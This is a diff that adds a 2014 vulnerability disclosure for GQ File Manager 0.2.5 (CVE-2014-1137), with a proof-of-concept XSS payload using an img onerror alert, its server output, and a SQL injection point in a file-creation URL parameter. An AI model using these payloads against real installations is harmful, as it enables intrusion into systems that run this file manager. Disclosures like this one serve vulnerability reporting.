@@ -1,0 +1,52 @@
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                 INDEPENDENT SECURITY RESEARCHER 
+                   PENETRATION TESTING SECURITY
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+
+# Exploit Title: GQ File Manager - Sql Injection - Cross Site Scripting Vulnerability's 
+# Date: 19/12/2014
+# Url Vendor: http://installatron.com/phpfilemanager
+# Vendor Name: GQ File Manager 
+# Version: 0.2.5 
+# CVE:  CVE-2014-1137
+# Author: TaurusOmar	
+# Tiwtter: @TaurusOmar_
+# Email:  taurusomar13@gmail.com
+# Home:  overhat.blogspot.com
+# Tested On: Bugtraq Optimus
+# Risk: High
+
+Description
+GQ File Manager is a lightweight file manager that enables files to be uploaded to and downloaded from a server directory. GQ File Manager is great for creating and maintaining a simple cloud-based repository of files that can be accessed from anywhere on the Internet. 
+
+------------------------
++ CROSS SITE SCRIPTING + 
+------------------------
+# Exploiting Description - Created new file example:("xss.html")in the document insert code xss
+
+Input:
+"><img src=x onerror=;;alert('XSS') />
+Output: 
+<br />
+<b>Warning</b>:  fread() [<a href='function.fread'>function.fread</a>]: Length parameter must be greater than 0 in <b>/home/u138790842/public_html/gp/incl/edit.inc.php</b> on line <b>44</b><br />
+"><img src=x onerror=alert("xss");>
+
+#P0c
+"><img src=x onerror=;;alert('XSS') />
+
+#Proof Concept
+http://i.imgur.com/cjIvR5l.jpg
+
+
+------------------------
++    Sql Injection     +
+------------------------
+# Exploiting Description - The Sql Injection in path created a new file. 
+
+#P0c
+http://site.com/GQFileManager/index.php?&&output=create&create=[sql]
+
+#Proof Concept
+http://i.imgur.com/IJZoDVt.jpg
+
